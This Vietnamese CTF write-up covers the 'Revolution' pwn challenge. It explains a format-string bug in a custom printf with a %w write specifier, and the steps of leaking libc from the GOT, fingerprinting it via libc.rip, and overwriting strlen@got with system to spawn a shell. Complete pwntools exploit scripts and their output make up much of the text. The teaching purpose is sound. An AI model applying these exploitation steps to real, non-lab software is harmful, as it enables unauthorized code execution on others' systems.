# Revolution — Writeup (bản mở rộng, có giải đáp thắc mắc)

**Thể loại:** Pwn
**Kiến trúc:** x86-64, Linux, ELF động (dynamically linked, dùng libc)
**Kỹ thuật chính:** Format String → Arbitrary Read/Write → **GOT Overwrite** (ghi đè `strlen@got` bằng `system`)

---

## 1. Khảo sát ban đầu

```
┌──(root㉿kali)-[/home/whoknows/Downloads/revo]
└─# checksec --file=./revolution
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY ...
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   RUNPATH     No Symbols      No      ...
```

| Trường                    | Giá trị                    | Ý nghĩa với ta                                                             |
|---------------------------|----------------------------|----------------------------------------------------------------------------|
| **Partial RELRO**         | GOT **vẫn ghi được**       | Cho phép **GOT overwrite** — đây là chìa khóa cả bài                       |
| **No canary**             | không có canary            | Không cần lo leak canary                                                   |
| **NX enabled**            | stack `rw-`, không execute | **Không** dùng shellcode trên stack được → phải ROP/ret2libc               |
| **No PIE**                | địa chỉ cố định            | Địa chỉ GOT cố định (`0x404000`…) → biết trước, không cần leak base binary |
| **No Symbols (stripped)** | mất tên hàm                | Khó khăn chính nằm ở **dịch ngược**, không phải mitigation                 |


- `No canary` ở bài này **không thực sự được dùng** — vì bài **không có stack overflow** (`read` chỉ đọc 511 byte vào buffer 536 byte).
- Hướng khai thác là **`Partial RELRO`** (GOT ghi được) + **`No PIE`** (địa chỉ GOT cố định) + **NX** (buộc mượn code libc).
- **Mức bảo vệ duy nhất thực sự có tác dụng** ở bài này là **`NX`**: nó chặn hẳn hướng "shellcode trên stack", buộc ta phải đi đường tráo hàm trong libc.

---

## 2. Phân tích `main`

```
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  ssize_t v3;            // rax
  char v5[536];          // [rsp+0h] [rbp-218h]

  write(1, "=== PRINT PRINT REVOLUTION ===\n", 0x1F);
  write(1, "Enter your score card template:\n", 0x20);
  while (1) {
    write(1, "score> ", 7);
    v3 = read(0, v5, 0x1FF);
    if (v3 <= 0) break;
    v5[v3] = 0;
    v5[strcspn(v5, "\n")] = 0;
    sub_401330(v5, v5[0]);
    write(1, "\n", 1);
  }
  return 0;
}
```

Đọc từng dòng:

- `char v5[536]` — `0x218 = 536`. Buffer nằm ở `rbp-0x218`.
- `read(0, v5, 0x1FF)` — `0x1FF = 511`. **511 < 536 → Không có stack overflow.
- `v5[v3] = 0` và `v5[strcspn(v5,"\n")] = 0` — tự thêm NUL kết chuỗi và cắt `\n`. An toàn về mặt ghi (index tối đa 511 < 536).
- `sub_401330(v5, v5[0])` — truyền nguyên chuỗi ta vừa nhập vào một hàm xử lý.
- `while(1)` — chương trình lặp mãi, mỗi lần in `score> ` rồi đọc tiếp, cho phép ta "nói chuyện" nhiều lần trong cùng một tiến trình → cần cho exploit nhiều bước dưới ASLR.

---

## 3. `sub_401330` — một `printf` tự viết tay

Binary stripped nên hàm không tên. Dịch ngược cho thấy nó là một **trình diễn giải định dạng viết tay**, hỗ trợ:

| Specifier   | Hành vi                                                        | Vai trò                                 |
|-------------|----------------------------------------------------------------|-----------------------------------------|
| `%%`        | in ra ký tự `%`                                                | —                                       |
| `%x` / `%p` | in **GIÁ TRỊ** của 1 đối số dạng hex (16 chữ số)               | thăm dò stack, Không đọc bộ nhớ         |
| `%s`        | coi 1 đối số là con trỏ, `strlen` rồi `write` chuỗi tại đó     | ĐỌC bộ nhớ tùy ý                        |
| `%N$`       | dùng đối số thứ N (positional)                                 | chọn đối số mục tiêu                    |
| **`%w`**    | `[đối_số_N] = đối_số_(N+1)`                                    | Ghi bộ nhớ tùy ý                        |

Như đã thấy, `sub_401330` là một hàm **printf viết tay do chính tác giả tự code**, chứ không phải `printf` của libc. Tác giả **cố tình để lại `%w`** — một specifier riêng, cho phép **ghi một giá trị vào một địa chỉ bộ nhớ bất kỳ**. Cơ chế của nó là: **không truyền đối số**, nên chương trình tự bốc **hai ô liên tiếp** — ô #7 làm **địa chỉ đích (dest)**, ô #8 làm **giá trị (value)** — rồi thực hiện `[dest] = value`.

Lợi dụng điều đó, ta ghi đè **ô GOT của `strlen`** bằng **địa chỉ của `system`**. Từ đây, mỗi khi chương trình gọi `strlen` trên chuỗi ta nhập, nó sẽ thực chất gọi `system`. Cuối cùng, ta dùng `%s` để kích hoạt: gửi chuỗi `/bin/sh` — chương trình tưởng đang gọi `strlen("/bin/sh")`, nhưng thực tế chạy `system("/bin/sh")`, và ta chiếm được shell.

Bên cạnh đó, ta còn dùng các specifier khác để **trinh sát và định vị**:

- `%p` / `%x` để **nhìn giá trị các đối số** (chỉ in con số, **không** dereference) → dò ra **buffer của ta nằm ở ô #6**, từ đó suy ra vị trí các đối số #7, #8.
- `%N$` để **chỉ định thẳng đối số thứ N** cần dùng.
- `%s` để **đọc nội dung bộ nhớ** tại một con trỏ — cụ thể là đọc **địa chỉ thật của hàm trong libc, vốn được lưu trong ô GOT** (ví dụ `write@got`), từ đó suy ra `libc_base`.


Trước khi làm được bất cứ gì, ta **bắt buộc** phải biết **buffer `v5` (chuỗi ta nhập) nằm ở ô đối số thứ mấy**. Lý do: mọi payload `%N$s` / `%N$w` đều phải nhắm đúng ô chứa **dữ liệu do ta kiểm soát**. Nếu đoán sai ô, ta sẽ trỏ vào vùng nhớ lung tung, không kiểm soát được con trỏ/giá trị.

Ta dùng chính `%p` (chỉ in con số của đối số, không dereference) để "nhìn" từng ô. Cách làm:

- Đặt một **marker** nhận dạng được ở đầu input: 8 chữ `A` → giá trị `0x4141414141414141`.
- Đặt một **probe** `%N$p` ngay sau để hỏi "ô #N chứa gì".

```
payload = b"AAAAAAAA" + b"%6$p"
          └ marker ┘    └ probe ┘
```

Ta gửi `b"AAAAAAAA" + b"%N$p"` với N chạy từ 1 đến 9, xem ô nào "echo" lại đúng marker:


Code `probe_offset.py` chạy để tự thấy log dò:
```python
from pwn import *
context.log_level = "error"
context.arch = "amd64"

p = remote("chal.sunshinectf.games", 26002)
p.recvuntil(b"score> ")

for n in range(1, 10):
    payload = b"AAAAAAAA" + ("%%%d$p" % n).encode()
    p.sendline(payload)
    line = p.recvuntil(b"score> ", drop=True).rstrip(b"\n")
    print("[*] thu #%d -> %s" % (n, line.decode(errors="replace")))

p.close()
```

```
$ python3 probe_offset.py
[*] thu #1 -> 0x0000000000000000
[*] thu #2 -> 0x0000000000000000
[*] thu #3 -> 0x00007ffd1a2c3d40      (con trỏ stack, không phải marker)
[*] thu #4 -> 0x0000000000000000
[*] thu #5 -> 0x0000000000000000
[*] thu #6 -> 0x4141414141414141   <-- KHỚP MARKER!
[*] thu #7 -> 0x7024362500000000      (chính là chuỗi "%6$p" ta gửi)
[*] thu #8 -> 0x0000000000000000
[*] thu #9 -> 0x0000000000000000
```

- Dòng `#6 -> 0x4141414141414141` chính là 8 chữ `A` → buffer của ta bắt đầu ở ô #6.
- Dòng `#7 -> 0x7024362500000000` là dãy byte `%6$p` (little-endian: `25 24 36 70` = `%`, `$`, `6`, `p`) → đúng như ta đặt ở offset 8.

Vì sao luôn có ít nhất một dòng khớp? Vì buffer ta nhập nằm trọn trong vùng đối số. Marker 8 byte ở offset 0 → nó là một ô đối số hoàn chỉnh, nên `%N$p` ở đúng số sẽ in ra nguyên giá trị `0x4141414141414141`.

Từ `#6`, suy ra mọi offset tiếp theo:

```
offset  0 → đối số #6      (8 byte đầu của input)
offset  8 → đối số #7      <-- đặt CON TRỎ (cho %s) / DEST (cho %w)
offset 16 → đối số #8      <-- đặt VALUE (cho %w)
```

Bảng quy đổi:

| Offset trong input | Ô đối số | Dùng làm gì               |
|--------------------|----------|---------------------------|
| 0                  | #6       | đặt lệnh `%7$s` / `%7$w`  |
| 8                  | #7       | con trỏ (đọc) hoặc dest   |
| 16                 | #8       | value (chỉ dùng cho `%w`) |


Biết buffer ở #6 là **chìa khóa** biến format string thành công cụ đọc/ghi có kiểm soát:

**a) Đọc tùy ý (`%s`)** — đặt con trỏ ở offset 8:

```
offset 0 : "%7$s" + \x00*4
offset 8 : p64(0x404000)       -> ô #7 = write@got
-> %s đọc 8 byte tại 0x404000 = địa chỉ thật của write -> leak libc
```

**b) Ghi tùy ý (`%w`)** — đặt `dest` ở offset 8, `value` ở offset 16:

```
offset 0  : "%7$w" + \x00*4
offset 8  : p64(0x404008)      -> ô #7 = dest  = strlen@got
offset 16 : p64(system_thật)   -> ô #8 = value
-> *(0x404008) = system     => tráo strlen@got thành system
```

**c) Kích hoạt** — đặt địa chỉ `/bin/sh` ở offset 8:

```
offset 0 : "%7$s" + \x00*4
offset 8 : p64(libc_base + 0x1cb42f)
-> %s gọi strlen(rdi=/bin/sh) mà strlen đã là system -> system("/bin/sh") -> SHELL
```

Nói gọn: từ con số #6, ta suy ra được offset 8 = ô #7, offset 16 = ô #8; và cả ba vòng khai thác chỉ là việc "điền đúng chỗ" cho từng payload.**

## 4. GOT và PLT — trái tim của bài

### 4.1. Vấn đề: binary không chứa code libc

`revolution` không chứa code của `write`, `read`, `strlen`... Chúng nằm trong **libc.so.6**, nạp kèm khi chạy. Lúc biên dịch, địa chỉ của `write` chưa biết (libc chưa nạp, lại còn ASLR). Nên cần cơ chế trung gian: PLT và GOT.

### 4.2. PLT (đường dây) và GOT (danh bạ)

PLT = bảng các đoạn code nhỏ, cố định trong binary. Khi gọi `write`, trình biên dịch sinh lệnh gọi `write@plt`.

GOT = bảng các ô nhớ 8 byte, ghi được, cố định, mỗi ô chứa địa chỉ thật của một hàm trong libc.

```
GOT (mỗi ô 8 byte):
  0x404000  write@got   -> ??? địa chỉ thật của write
  0x404008  strlen@got  -> ???
  0x404010  strcspn@got -> ???
  0x404018  read@got    -> ???
  0x404020  setvbuf@got -> ???
```

Luồng gọi hàm:

```
code -> call write@plt -> jmp [0x404000] -> write() thật trong libc
              (PLT: đường dây cố định)   (GOT: danh bạ chứa địa chỉ)
```

> PLT là "đường dây cố định", GOT là "danh bạ" cho biết đầu dây kia nối tới hàm thật ở đâu.

### 4.3. Ai điền địa chỉ thật vào GOT? — Lazy binding

Lúc mới nạp, các ô GOT chưa có địa chỉ thật. Lần đầu tiên gọi `write`:

```
write@plt -> GOT chưa có -> gọi dynamic linker
          -> linker tra địa chỉ write trong libc
          -> GHI địa chỉ thật vào ô GOT          <-- GHI VÀO GOT
          -> nhảy tới write() thật
```

Lần thứ hai trở đi: `jmp [GOT]` nhảy thẳng. Cơ chế này gọi là lazy binding.

**Hệ quả:** GOT buộc phải ghi được lúc chạy — đó là lý do tồn tại của `Partial RELRO`.

### 4.4. RELRO quyết định GOT có bị khóa không

| Mức | `.got` | `.got.plt` (GOT hàm thư viện) |
|---|---|---|
| No RELRO | ghi được | ghi được |
| **Partial RELRO** | chỉ đọc | **ghi được** ← bài này |
| Full RELRO | chỉ đọc | chỉ đọc |

`Full RELRO` bật `BIND_NOW` (resolve hết mọi hàm lúc nạp) rồi `mprotect` GOT thành **read-only** → hướng GOT overwrite chết. `revolution` là `Partial RELRO` → **GOT vẫn ghi được** → tráo hàm được.


## 5. Leak địa chỉ libc

```
offset 0 : b"%7$s"              <- LỆNH: đọc chuỗi tại con trỏ là đối số #7
offset 4 : b"\x00" * 4          <- kết thúc format string, đẩy địa chỉ về offset 8
offset 8 : p64(0x404000)        <- đây CHÍNH LÀ đối số #7 = write@got
```

Bố cục theo ô 8 byte:

```
[ %7$s ]        <- 4 byte đầu của ô #6
[\0\0\0\0]      <- 4 byte sau của ô #6
[ 0x404000 ]    <- ô đối số #7   <-- %7$s đọc đúng chỗ này
```

Kết quả: `%s` coi `0x404000` là con trỏ → đọc 8 byte tại đó = địa chỉ thật của `write` → in ra. Thường chỉ được **6 byte** rồi gặp `\x00` (vì địa chỉ libc dạng `0x00007f...`, 2 byte cao là 0, `%s` dùng `strlen` dừng ở NUL).

Ta "leak địa chỉ libc từ GOT" cụ thể thế nào?
| # | Mắt xích | Vì sao làm được |
|---|---|---|
| 1 | Địa chỉ ô GOT cố định (`0x404000`) | **No PIE** |
| 2 | Buffer của ta ở **đối số #6** → offset 8 = ô #7 | đặc điểm `sub_401330` |
| 3 | `%7$s` **dereference** ô #7 → đọc 8 byte tại `0x404000` | `%s` = strlen + write |
| 4 | 6 byte in ra, bù `\x00` → địa chỉ `write` trong libc | byte cao địa chỉ là `0x00` |

> Ta không "tính" ra địa chỉ libc. Ta trỏ `%s` vào ô GOT — nơi đang cất sẵn địa chỉ libc — và để chương trình tự in ra.

### Vì sao "bắt buộc" là `write`? Và địa chỉ GOT tìm ở đâu?

**Địa chỉ GOT** lấy từ file (vì **No PIE** → địa chỉ trong file = lúc chạy):

```bash
objdump -R ./revolution        # liệt kê ô GOT + tên hàm + địa chỉ
readelf -rW ./revolution       # bảng relocation
```
```python
elf = ELF("./revolution"); elf.got["write"]   # 0x404000
```

**Vì sao chọn `write`?** Ba điều kiện, chỉ `write` (và `read`) hội đủ:

| Điều kiện | `write` | `strlen` | `setvbuf` |
|---|---|---|---|
| Địa chỉ GOT biết trước | ✅ | ✅ | ✅ |
| **Đã resolve trước khi ta gõ input** | ✅ | ❌ (chưa gọi) | ❌ (có thể chưa gọi) |
| **Là FUNC, không IFUNC** | ✅ | ❌ IFUNC | ✅ |
| **Có trong DB libc.rip** | ✅ | (không dùng) | ❌ thiếu |

- **Lazy binding:** ô GOT chỉ có địa chỉ thật **sau khi hàm được gọi lần đầu**. `write` in banner **trước** khi ta gõ input → chắc chắn đã resolve.
- **IFUNC:** `strlen`/`strcspn` là IFUNC → ô GOT giữ **bản thực thi chọn lúc load** (`__strlen_avx2`...), **không phải** offset symbol → không dùng để fingerprint/leak.

---

## 6. ASLR và libc khác phiên bản

Công thức nền:

```
libc_base = (địa chỉ thật của write) - (offset của write trong libc)
system    = libc_base + (offset của system trong libc)
```

Hai vấn đề **độc lập**:

| Vấn đề | Bản chất | Ảnh hưởng local? | Ảnh hưởng remote? |
|---|---|---|---|
| **ASLR** | địa chỉ libc đổi mỗi lần chạy | ✅ có (vẫn phải leak) | ✅ có (vẫn phải leak) |
| **Khác phiên bản libc** | offset hàm khác giữa các libc | ❌ không | ✅ có (phải tải libc server) |


## 7. Fingerprint libc — tìm đúng phiên bản

### 7.1. Dấu vân tay 12 bit thấp

Vì **libc_base luôn canh trang** (bội số `0x1000`):

```
địa chỉ write = libc_base        + offset(write)
              = 0x???????000     + 0x11c560
                 12 bit thấp = 0    giữ nguyên
```

→ **12 bit thấp của địa chỉ = 12 bit thấp của offset** (bất biến, không phụ thuộc ASLR):

```
(địa chỉ) & 0xfff  ==  offset & 0xfff
```

Leak `read` + `write` (`FUNC`), lấy `low12`:

```
write low12 = 0x560
read  low12 = 0xa50
```

Tra **libc.rip** (`POST https://libc.rip/api/find`, `{"symbols":{"write":"560","read":"a50"}}`).

### 7.2. Offset là gì và đọc ở đâu?

Offset **không phải "tính"** — nó là con số đọc sẵn trong **symbol table** của file libc (cột `Value`):

```bash
readelf -sW ./libc.so.6 | grep -E ' write@@| read@@| system@@'
```

```
000000000011c560 ... write@@GLIBC_2.2.5     -> offset(write)
000000000011ba50 ... read@@GLIBC_2.2.5      -> offset(read)
0000000000058740 ... system@@GLIBC_2.2.5    -> offset(system)
```

`libc.sym["write"]` trong pwntools làm đúng việc này.

### Làm sao từ offset tìm ra "đúng thư viện"? Và công thức tính base?


**leak → 12 bit thấp → tìm thư viện → rồi mới đọc offset.**

```
Bước 1: leak write = 0x7a419205a560
Bước 2: & 0xfff    = 0x560          <- 12 bit thấp của offset(write), KHÔNG cần base
        leak read  = 0x...a50       <- vân tay thứ hai
Bước 3: tra libc.rip bằng {write:560, read:a50}
        -> 9 ứng viên libc6_2.39-0ubuntu8.x   <- định danh thư viện
Bước 4: đọc offset từ file: write=0x11c560, system=0x58740, /bin/sh=0x1cb42f
Bước 5: base = leak - offset(write)  = 0x7a419205a560 - 0x11c560 = 0x7a4191f3e000
Bước 6: tự kiểm  base & 0xfff == 0   -> canh trang ✅
```

**Vòng tròn "muốn biết offset cần biết libc, muốn biết libc cần biết base" KHÔNG tồn tại** — vì:

```
libc_base = 0x???????000   -> 12 bit thấp = 0
=> (địa chỉ leak) & 0xfff = offset & 0xfff
```

Ta lấy được **12 bit thấp của offset mà KHÔNG cần base**. Đó là mảnh ghép phá vòng tròn. libc.rip là **kho libc** để tra vân tay → nhận diện → có offset đầy đủ → rồi mới tính base.

**Công thức:**

```
libc_base = leak - offset            (từ: địa_chỉ = base + offset)
system    = libc_base + offset(system)
binsh     = libc_base + offset("/bin/sh")
```

Tự kiểm: `base & 0xfff == 0`. Nếu không → trừ sai offset (chọn nhầm libc, hoặc dùng offset máy mình thay vì của server).

### 7.3. Kết quả fingerprint (remote)

9 ứng viên, tất cả `libc6_2.39-0ubuntu8.x` (Ubuntu 24.04, glibc 2.39). So sánh các hàm:

| Hàm | Số giá trị khác nhau | Giá trị |
|---|---|---|
| `write` | 1 | `0x11c560` |
| `read` | 1 | `0x11ba50` |
| `/bin/sh` | 1 | `0x1cb42f` |
| **`system`** | **2** | `0x58740` (7 bản) hoặc `0x58750` (8.4, 8.5) |

### Có 9 ứng viên, làm sao biết đâu là bản chuẩn?

Cả 9 bản có `read`, `write`, `/bin/sh` **giống hệt nhau** → từ 2 điểm dữ liệu leak được (`read`, `write`), chúng **bất khả phân biệt**. Nhưng **không cần tách**:

- `read`, `write`, `/bin/sh` giống hết → `base` và `binsh` **không phụ thuộc** chọn bản nào.
- **`system` là biến duy nhất**: `0x58740` (7 bản) hay `0x58750` (2 bản).

→ Chiến lược: lấy 1 bản đại diện, chạy với `system = 0x58740`; nếu không ra shell thì đổi **đúng 1 con số** sang `0x58750`. **Tối đa 2 lần thử, cùng 1 file libc** — không phải mò 9 lần.


---

## 8. Chuỗi khai thác hoàn chỉnh (3 vòng, cùng một tiến trình)

```
Vòng 1:  %7$s + write@got            -> leak write -> libc_base      (ĐỌC)
Vòng 2:  %7$w + strlen@got + system  -> [strlen@got] = system         (GHI)
Vòng 3:  %7$s + "/bin/sh"            -> strlen("/bin/sh") == system("/bin/sh") -> SHELL
```

**Vì sao cả 3 phải cùng một tiến trình:** `libc_base` và việc tráo GOT chỉ đúng trong **một lần chạy**; đóng kết nối là ASLR đổi lại. Vòng lặp `while` trong `main` cho phép gửi 3 lần liên tiếp.

### 7.1. Cú lừa ở Vòng 3

Trong `main` có `v5[strcspn(v5, "\n")] = 0;` — và `sub_401330` xử lý `%s` bằng **`strlen` trước, rồi `write`**:

```
%s  ->  con trỏ = đối số
        len = strlen(con trỏ)     <-- GỌI strlen TRƯỚC
        write(1, con trỏ, len)
```

Sau khi `strlen@got` đã = `system`:

```
chương trình định gọi:   len = strlen("/bin/sh")     <- để đo độ dài
thực tế xảy ra:          system("/bin/sh")           <- vì strlen@got = system
                         -> shell!
```

**Chỗ nổ là lời gọi `strlen`** (không phải `write`), và vì `%s` gọi `strlen` với chính con trỏ `/bin/sh` làm tham số `rdi`, ta không cần set thanh ghi gì cả — `rdi` tự = `/bin/sh`.


## 9. Script exploit
Đầu tiên chạy chương trình này trước để có thể leak được thư viện mà server đang sử dụng:
```python
import json
import urllib.request

from pwn import ELF, context, log, p64, remote, u64

context.log_level = "info"
context.arch = "amd64"

HOST = "chal.sunshinectf.games"
PORT = 26002

# GOT that cua binary (No PIE => dia chi co dinh)
GOT = {
    "write":   0x404000,
    "strlen":  0x404008,
    "strcspn": 0x404010,
    "read":    0x404018,
    "setvbuf": 0x404020,
}

# Chi dung 2 ham nay de fingerprint (FUNC that, co trong DB libc.rip)
FINGERPRINT = ["read", "write"]


def leak_addr(p, addr):
    """Doc 8 byte tai `addr` bang %7$s, tra ve (gia tri, so byte doc duoc)."""
    #  offset 0 : "%7$s"        -> in chuoi tai con tro la arg #7
    #  offset 4 : 4 byte NUL    -> ket thuc chuoi format
    #  offset 8 : 8 byte addr   -> chinh la arg #7
    payload = b"%7$s" + b"\x00" * 4 + p64(addr)
    p.recvuntil(b"score> ")
    p.sendline(payload)
    raw = p.recvline().rstrip(b"\n")          # %s in den khi gap NUL
    return u64(raw.ljust(8, b"\x00")), len(raw)


def query_libc_rip(leaks):
    q = {n: format(leaks[n] & 0xFFF, "x") for n in FINGERPRINT}
    log.info("Query libc.rip: %s", json.dumps(q))
    req = urllib.request.Request(
        "https://libc.rip/api/find",
        data=json.dumps({"symbols": q}).encode(),
        headers={"Content-Type": "application/json"},
    )
    return json.loads(urllib.request.urlopen(req, timeout=30).read())


def pick_exact(cands, leaks):
    """Ung vien nao cho CUNG base cho moi ham fingerprint => chinh xac."""
    exact = []
    for c in cands:
        syms = c.get("symbols", {})
        bases, used = set(), 0
        for n in FINGERPRINT:
            off = syms.get(n)
            if off is None:
                continue
            off = int(off, 16) if isinstance(off, str) else off
            bases.add(leaks[n] - off)
            used += 1
        if used == len(FINGERPRINT) and len(bases) == 1:
            base = bases.pop()
            if base & 0xFFF == 0:
                exact.append((c, base))
    return exact


def main():
    p = remote(HOST, PORT)
    leaks = {}
    for name, addr in GOT.items():
        val, n = leak_addr(p, addr)
        leaks[name] = val
        log.success("%-8s @ %#x -> %#018x  (low12=%#03x, %d byte)",
                    name, addr, val, val & 0xFFF, n)
    p.close()

    cands = query_libc_rip(leaks)
    log.info("libc.rip tra ve %d ung vien", len(cands))

    exact = pick_exact(cands, leaks)
    if not exact:
        log.failure("Khong tim duoc libc khop hoan toan -> chay lai (ASLR co the lam leak hong)")
        for c in cands[:15]:
            print("   ung vien:", c.get("id"), c.get("download_url"))
        return

    # Nhieu patch version co the trung read/write -> tai ban dau tien.
    c, base = exact[0]
    log.success("LIBC KHOP: %s", c.get("id"))
    log.success("libc_base = %#x", base)
    log.info("co %d ung vien khop (cac patch gan giong nhau)", len(exact))

    url = c.get("download_url")
    log.info("tai libc: %s", url)
    data = urllib.request.urlopen(url, timeout=60).read()
    with open("libc.so.6", "wb") as f:
        f.write(data)
    log.success("da luu ./libc.so.6 (%d byte)", len(data))

    libc = ELF("./libc.so.6", checksec=False)
    system = libc.sym["system"]
    binsh = next(libc.search(b"/bin/sh\x00"))
    log.success("offset system   = %#x", system)
    log.success("offset /bin/sh  = %#x", binsh)
    log.info("system that  = %#x", base + system)
    log.info("binsh that   = %#x", base + binsh)

    print("\n[*] Buoc tiep theo: chay  python3 exploit_remote.py")


if __name__ == "__main__":
    main()
```
Sau khi leak xong thì tấn công bằng chương trình sau:
```python
from pwn import *

context.log_level = "info"
context.arch = "amd64"

HOST, PORT = "chal.sunshinectf.games", 26002
WRITE_GOT  = 0x404000
STRLEN_GOT = 0x404008

libc = ELF("./libc.so.6", checksec=False)   # tai ve tu buoc fingerprint

p = remote(HOST, PORT)

# ---- Vong 1: leak write@got -> libc_base ----
p.recvuntil(b"score> ")                      # an banner + prompt #1
p.sendline(b"%7$s" + b"\x00"*4 + p64(WRITE_GOT))
data = p.recvuntil(b"score> ", drop=True)
data = data[:-1] if data.endswith(b"\n") else data
leak = u64(data.ljust(8, b"\x00"))
libc.address = leak - libc.sym["write"]

assert libc.address & 0xFFF == 0, "sai libc -> chay lai fingerprint"

system = libc.sym["system"]
binsh  = next(libc.search(b"/bin/sh\x00"))
log.success("leak=%#x base=%#x system=%#x" % (leak, libc.address, system))

# ---- Vong 2: ghi system vao strlen@got ----
p.sendline(b"%7$w" + b"\x00"*4 + p64(STRLEN_GOT) + p64(system))
p.recvuntil(b"score> ")

# ---- Vong 3: strlen("/bin/sh") -> system("/bin/sh") ----
p.sendline(b"%7$s" + b"\x00"*4 + p64(binsh))

p.interactive()
```

> **Nếu không ra shell:** đổi `system` sang `0x58750` (biến thể patch `8.4`/`8.5`) rồi chạy lại — cùng 1 file libc, chỉ đổi 1 con số.

### 9. Cạm bẫy `recvline`

**Đừng dùng `p.recvline()` để lấy leak `%s`.** Dữ liệu leak là **byte thô** của địa chỉ; nếu một byte bằng `0x0a` (`\n`) thì `recvline` dừng sớm.

Thực tế: địa chỉ `read` là `...f80a50` → byte thứ hai chính là `0x0a` → `recvline` chỉ lấy được `0x50` → libc.rip trả về **0 ứng viên**.

Cách đúng: đọc tới mốc `"score> "` rồi bỏ **đúng một** `\n` mà chương trình in thêm:

```python
data = p.recvuntil(b"score> ", drop=True)
data = data[:-1] if data.endswith(b"\n") else data
leak = u64(data.ljust(8, b"\x00"))
```

> **Mẹo nhận diện:** luôn **giải mã leak ra ASCII** trước. `0x4e495250203d3d3d` → `"=== PRIN"` = banner, không phải địa chỉ. Địa chỉ thật luôn bắt đầu `0x7f`.

---

## 10. Kết quả

```
[+] leak write   = 0x70e71e8b8560
[+] libc_base    = 0x70e71e79c000
[*] system       = 0x70e71e7f4740
[*] /bin/sh      = 0x70e71e96742f
[*] Switching to interactive mode
$ ls
flag.txt
$ cat flag.txt
sun{cust0m_fmtstr_n0_t00ls_4ll0wed}
```

**Flag:** `sun{cust0m_fmtstr_n0_t00ls_4ll0wed}`

---

## 11. Tổng kết kỹ thuật

| Bước | Cơ chế |
|---|---|
| Nhận diện lỗi | `main` đưa input vào `sub_401330` = `printf` tự viết → **format string** |
| Xác định offset | Buffer `v5` = **đối số #6** (dò bằng `%p`) → offset 8 = ô #7, offset 16 = ô #8 |
| Đọc tùy ý | `%7$s` + `p64(địa_chỉ)` → dereference, in chuỗi tại địa chỉ bất kỳ |
| Ghi tùy ý | `%7$w` + `p64(dest)` + `p64(value)` → `[dest] = value` |
| Leak libc | `%7$s` đọc `write@got` (đã resolve do in banner) → `libc_base = leak - offset(write)` |
| Fingerprint | 12 bit thấp của `read`/`write` (bất biến ASLR) → libc.rip → tải `libc.so.6` |
| GOT overwrite | `%7$w` ghi `system` vào `strlen@got` (Partial RELRO → ghi được) |
| Kích hoạt | `%7$s` + `/bin/sh` → `strlen(rdi=/bin/sh)` (bên trong `%s`) = `system("/bin/sh")` |

**Điểm cốt lõi:** ta không tiêm shellcode, không ROP gadget. Ta **lập trình lại bộ nhớ bằng dữ liệu** — biến các *lệnh in* `%s`/`%w` thành *đọc/ghi bộ nhớ*, rồi tráo bảng GOT để một hàm vô hại (`strlen`) trở thành `system`.

**Năm bài học để nhớ:**

1. **Format string = primitive đọc/ghi.** Input của ta vừa là **lệnh** (`%7$s`/`%7$w`), vừa là **dữ liệu** (địa chỉ ở offset 8/16) — vì buffer nằm ở **đối số #6**. `%s` đọc (dereference con trỏ), `%w` ghi (`[dest]=value`).
2. **PLT ≠ GOT.** PLT là **code** (`jmp [GOT]`); GOT là **dữ liệu** chứa địa chỉ thật. Ta **đọc nội dung GOT**, không đi qua PLT.
3. **ASLR đổi base, không đổi file.** `base = leak - offset` (cần leak); offset lấy từ file libc (cần đúng phiên bản). Cần **cả hai**.
4. **12 bit thấp phá vòng tròn.** `leak & 0xfff = offset & 0xfff` (vì base canh trang) → tra libc.rip → nhận diện thư viện **mà không cần base**. Tự kiểm `base & 0xfff == 0`.
5. **Chuẩn bị biến thể khi libc.rip không tách được patch.** 9 ứng viên giống nhau ở mọi thứ trừ `system` (`0x58740`/`0x58750`) → thử tối đa 2 lần. Và **`recvline()` là cái bẫy** với leak byte thô → đọc theo mốc prompt, bỏ đúng một `\n`.

*(Cái tên "Revolution" là gợi ý: input của bạn **lật ngược** vai trò — từ dữ liệu được in thành **lệnh** điều khiển chương trình.)*
